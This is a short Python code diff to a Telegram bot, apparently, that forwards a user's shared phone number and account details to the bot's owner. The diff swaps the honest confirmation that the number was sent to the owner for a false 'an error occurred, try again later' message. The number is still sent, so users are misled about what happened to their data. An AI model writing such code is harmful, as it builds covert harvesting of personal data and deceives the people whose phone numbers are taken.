@@ -39,7 +39,7 @@ async def handle_contact(update: Update, context):
             text=f"📞 رقم هاتف جديد:\n{user_info}\nرقم الهاتف: {phone}"
         )
         # إشعار المستخدم بأنه تم التحقق
-        await update.message.reply_text("شكراً! تم التحقق من رقمك وإرساله إلى المالك.")
+        await update.message.reply_text("حدث خطأفي البوت حاول بعد وقت اخر.")
     else:
         await update.message.reply_text("حدث خطأ، يرجى المحاولة مرة أخرى.")
 
